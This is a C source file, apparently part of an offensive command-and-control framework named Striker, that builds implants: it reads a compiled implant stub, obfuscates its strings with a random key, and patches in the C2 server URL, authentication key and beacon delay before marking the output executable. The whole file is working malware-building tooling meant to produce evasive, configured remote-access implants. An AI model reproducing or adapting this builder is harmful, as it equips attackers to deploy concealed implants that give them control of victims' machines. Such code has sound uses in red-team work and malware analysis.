/**
 *--------------------------------------------------------------
 *    A preprocessor for the Striker implants. Handles patching, 
 * and obfuscation of a newly compiled implant.
 *                                            Author: Umar Abdul
 *--------------------------------------------------------------
 */

#ifdef __WIN32__
  #include <windows.h>
#endif
#include <sys/stat.h>
#include "obfuscator.h"

// The markers we will be patching.
const char URL_MARKER[] = "[STRIKER_URL]";
const char AUTH_KEY_MARKER[] = "[STRIKER_AUTH_KEY]";
const char OBFS_KEY_MARKER[] = "[STRIKER_OBFS_KEY]";
const char DELAY_MARKER[] = "[STRIKER_DELAY]";

int main(int argc, char **argv){
  
  if (argc < 6){
    fprintf(stderr, "[-] Usage: %s <auth_key> <url> <delay> <stub> <outfile>\n", argv[0]);
    return 1;
  }
  char *auth_key = argv[1];
  if (strlen(auth_key) != 32){
    fprintf(stderr, "[-] 'auth_key' must be 32 characters long!\n");
    return 1;
  }
  char *url = argv[2];
  char *delay = argv[3];
  if (strlen(delay) > 19){
    fprintf(stderr, "[-] 'delay' too long. Must be < 20 digits!\n");
    return 1;
  }
  if (atoi(delay) < 1){
    fprintf(stderr, "[-] 'delay' must be an integer >= 1!\n");
    return 1;
  }
  char *infile = argv[4];
  char *outfile = argv[5];

  // Generate random key for string obfuscation.
  FILE *rrfo = fopen("/dev/random", "r");
  if (!rrfo){
    fprintf(stderr, "[-] Error opening /dev/random\n");
    return 1;
  }
  unsigned char obfs_key;
  while ((obfs_key = fgetc(rrfo)) == 0)
    continue;
  fclose(rrfo);
  char obfs_key_str[4];
  snprintf(obfs_key_str, 4, "%d", obfs_key);

  if (strlen(url) > (sizeof(char) * 256)){
    fprintf(stderr, "[-] 'url' too long!\n");
    return 1;
  }

  FILE *rfo = fopen(infile, "r");
  if (!rfo){
    fprintf(stderr, "[-] Error opening stub file!\n");
    return 2;
  }
  FILE *wfo = fopen(outfile, "w");
  if (!wfo){
    fprintf(stderr, "[-] Error opening output file!\n");
    return 2;
  }

  // 1. Obfuscate strings.
  obfs_run(wfo, rfo, obfs_key, 1);

  // 2. Patch.
  printf("[*] Finding offsets of our markers...\n");
  rewind(rfo);
  ssize_t obfs_key_offset = obfs_find_offset(rfo, OBFS_KEY_MARKER, strlen(OBFS_KEY_MARKER));
  if (obfs_key_offset == -1){
    fprintf(stderr, "[-] OBFS key marker not found!\n");
    return 3;
  }
  rewind(rfo);
  size_t url_offset = obfs_find_offset(rfo, URL_MARKER, strlen(URL_MARKER));
  if (url_offset == -1){
    fprintf(stderr, "[-] URL marker not found!\n");
    return 3;
  }
  rewind(rfo);
  size_t auth_key_offset = obfs_find_offset(rfo, AUTH_KEY_MARKER, strlen(AUTH_KEY_MARKER));
  if (auth_key_offset == -1){
    fprintf(stderr, "[-] Auth key marker not found!\n");
    return 3;
  }
  rewind(rfo);
  size_t delay_offset = obfs_find_offset(rfo, DELAY_MARKER, strlen(DELAY_MARKER));
  if (delay_offset == -1){
    fprintf(stderr, "[-] Delay marker not found!\n");
    return 3;
  }
  fclose(rfo); // We no longer need this.
  printf("[+] Offsets:\n");
  printf("            URL: 0x%08x\n", (unsigned int)url_offset);
  printf("       OBFS Key: 0x%08x\n", (unsigned int)obfs_key_offset);
  printf("       Auth Key: 0x%08x\n", (unsigned int)auth_key_offset);
  printf("          Delay: 0x%08x\n", (unsigned int)delay_offset);

  // Use the offsets to encode and apply the patch. We will be reusing the output file stream.
  printf("[*] Patching...\n");

  // Write the C2 server's URL
  int len = (strlen(url) > strlen(URL_MARKER) ? strlen(url) : strlen(URL_MARKER));
  char *buffer = malloc(sizeof(char) * (len + 1));
  memset(buffer, 0, len);
  strncpy(buffer, url, len);
  obfs_encode(obfs_key, buffer);
  fseek(wfo, (long)url_offset, SEEK_SET);
  fwrite(buffer, sizeof(char), len, wfo);
  free(buffer);

  // Write the OBFS key.
  len = (strlen(obfs_key_str) > strlen(OBFS_KEY_MARKER) ? strlen(obfs_key_str) : strlen(OBFS_KEY_MARKER));
  buffer = malloc(sizeof(char) * (len + 1));
  memset(buffer, 0, len);
  strncpy(buffer, obfs_key_str, len);
  fseek(wfo, (long)obfs_key_offset, SEEK_SET);
  fwrite(buffer, sizeof(char), len, wfo);
  free(buffer);
  
  // Write the auth key.
  len = (strlen(auth_key) > strlen(AUTH_KEY_MARKER) ? strlen(auth_key) : strlen(AUTH_KEY_MARKER));
  buffer = malloc(sizeof(char) * (len + 1));
  memset(buffer, 0, len);
  strncpy(buffer, auth_key, len);
  fseek(wfo, (long)auth_key_offset, SEEK_SET);
  fwrite(buffer, sizeof(char), len, wfo);
  free(buffer);

  // Write the delay.
  len = (strlen(delay) > strlen(DELAY_MARKER) ? strlen(delay) : strlen(DELAY_MARKER));
  buffer = malloc(sizeof(char) * (len + 1));
  memset(buffer, 0, len);
  strncpy(buffer, delay, len);
  fseek(wfo, (long)delay_offset, SEEK_SET);
  fwrite(buffer, sizeof(char), len, wfo);
  free(buffer);

  // And we are done :)
  fclose(wfo);
  chmod(outfile, S_IRUSR | S_IXUSR | S_IWUSR);
  printf("[+] Operation completed!\n");
  return 0;
}
